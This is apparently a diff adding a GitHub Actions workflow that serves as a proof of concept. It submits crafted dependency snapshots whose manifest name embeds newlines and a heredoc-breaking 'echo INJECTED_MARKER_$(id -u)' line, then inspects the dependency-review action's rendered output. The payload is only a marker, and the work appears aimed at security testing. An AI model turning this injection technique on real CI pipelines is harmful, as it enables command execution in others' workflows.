@@ -1,0 +1,91 @@
+name: snap-test
+on: workflow_dispatch
+permissions:
+  contents: write
+  pull-requests: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Record shas
+        id: sha
+        run: |
+          echo "base=$(git rev-parse HEAD~1)" >> "$GITHUB_OUTPUT"
+          echo "head=$(git rev-parse HEAD)" >> "$GITHUB_OUTPUT"
+
+      - name: Submit crafted dependency snapshots
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          BASE=$(git rev-parse HEAD~1)
+          HEAD=$(git rev-parse HEAD)
+          echo "base=$BASE head=$HEAD"
+          python3 - "$BASE" "$HEAD" <<'PY'
+          import json, sys, urllib.request, os
+          base, head = sys.argv[1], sys.argv[2]
+          repo = os.environ["GITHUB_REPOSITORY"]
+          tok = os.environ["GH_TOKEN"]
+          weird = "weird.json\nEOF\necho INJECTED_MARKER_$(id -u)\nEOF\nweird.json"
+          def snap(sha, manifests):
+              return {
+                  "version": 0,
+                  "job": {"id": "test-job", "correlator": "test-correlator", "html_url": "https://example.com"},
+                  "sha": sha,
+                  "ref": "refs/heads/main",
+                  "detector": {"name": "poc-detector", "version": "1.0.0", "url": "https://example.com"},
+                  "manifests": manifests,
+              }
+          def man(name, pkgs):
+              return {"name": name, "file": {"source_location": name},
+                      "resolved": {p: {"package_url": p, "relationship": "direct", "scope": "runtime"} for p in pkgs}}
+          base_snap = snap(base, {"package.json": man("package.json", ["pkg:npm/leftpad@1.0.0"])})
+          head_snap = snap(head, {
+              "package.json": man("package.json", ["pkg:npm/leftpad@1.0.0"]),
+              weird: man(weird, ["pkg:npm/evilpkg-poc@2.0.0"]),
+          })
+          def post(obj):
+              req = urllib.request.Request(
+                  f"https://api.github.com/repos/{repo}/dependency-graph/snapshots",
+                  data=json.dumps(obj).encode(),
+                  headers={"Authorization": f"Bearer {tok}", "Accept": "application/vnd.github+json",
+                           "Content-Type": "application/json", "User-Agent": "poc"},
+                  method="POST")
+              try:
+                  with urllib.request.urlopen(req) as r:
+                      print("submit", r.status, r.read().decode()[:300])
+              except Exception as e:
+                  print("submit FAILED", e, getattr(e, "read", lambda: b"")())
+          post(base_snap)
+          post(head_snap)
+          PY
+
+      - name: Compare result
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          BASE=$(git rev-parse HEAD~1)
+          HEAD=$(git rev-parse HEAD)
+          curl -sS --max-time 30 -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/dependency-graph/compare/$BASE...$HEAD?per_page=100" | head -c 4000
+
+      - name: Run dependency review action and dump comment-content
+        id: dr
+        uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294
+        with:
+          warn-only: true
+          base-ref: ${{ steps.sha.outputs.base }}
+          head-ref: ${{ steps.sha.outputs.head }}
+
+      - name: Show rendered output
+        env:
+          CONTENT: ${{ steps.dr.outputs.comment-content }}
+        run: |
+          mkdir -p out
+          printf '%s' "$CONTENT" > out/rendered.md
+          wc -c out/rendered.md
+          cat -A out/rendered.md | head -60
